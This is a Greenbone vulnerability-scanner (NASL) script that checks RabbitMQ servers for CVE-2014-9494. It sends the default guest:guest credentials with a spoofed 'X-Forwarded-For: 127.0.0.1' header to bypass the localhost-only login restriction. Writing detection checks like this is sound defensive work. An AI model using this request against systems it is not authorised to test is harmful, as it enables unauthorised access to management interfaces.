# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = 'cpe:/a:pivotal_software:rabbitmq';

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105177");
  script_cve_id("CVE-2014-9494");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:P/A:N");
  script_version("2023-07-25T05:05:58+0000");
  script_name("RabbitMQ 'rabbit_mgmt_util.erl' Security Bypass Vulnerability");
  script_tag(name:"last_modification", value:"2023-07-25 05:05:58 +0000 (Tue, 25 Jul 2023)");
  script_tag(name:"creation_date", value:"2015-01-22 16:55:31 +0100 (Thu, 22 Jan 2015)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_dependencies("gb_rabbitmq_web_management_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 15672);
  script_mandatory_keys("rabbitmq/web/installed");
  script_exclude_keys("keys/islocalhost");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/71859");

  script_tag(name:"impact", value:"An attacker can exploit this issue to bypass certain security
  restrictions to perform unauthorized actions. This may aid in further attacks.");

  script_tag(name:"vuldetect", value:"Send a HTTP GET request with a fake X-Forwarded-For header and check the response");

  script_tag(name:"insight", value:"RabbitMQ before 3.4.0 allows remote attackers to bypass the loopback_users restriction via a
  crafted X-Forwareded-For header.");

  script_tag(name:"solution", value:"Updates are available.");

  script_tag(name:"summary", value:"RabbitMQ is prone to a security-bypass vulnerability.");

  script_tag(name:"affected", value:"RabbitMQ 3.3.0 is vulnerable. Other versions may also be affected.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");


if( islocalhost() ) exit( 0 );

if( ! port = get_app_port( cpe:CPE, service: "www" ) ) exit( 0 );
useragent = http_get_user_agent();
host = http_host_name( port:port );

req = 'GET /api/whoami HTTP/1.1\r\n' +
      'Host: ' + host + '\r\n' +
      'User-Agent: ' + useragent + '\r\n' +
      'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
      'Accept-Language: de,en-US;q=0.7,en;q=0.3\r\n' +
      'Accept-Encoding: identity\r\n' +
      'Content-Type: application/json\r\n' +
      'Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=\r\n' + # guest:guest
      'Connection: close\r\n\r\n';

buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if( 'User can only log in via localhost' >!< buf || "401 Unauthorized" >!< buf ) exit( 0 );

req = 'GET /api/whoami HTTP/1.1\r\n' +
      'Host: ' + host + '\r\n' +
      'User-Agent: ' + useragent + '\r\n' +
      'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
      'Accept-Language: de,en-US;q=0.7,en;q=0.3\r\n' +
      'Accept-Encoding: identity\r\n' +
      'Content-Type: application/json\r\n' +
      'X-Forwarded-For: 127.0.0.1\r\n' +
      'Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=\r\n' + # guest:guest
      'Connection: close\r\n\r\n';

result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if( '"name":"guest"' >< result && "auth_backend" >< result && "not_authorised" >!< result )
{
  security_message( port:port );
  exit( 0 );
}

exit( 99 );
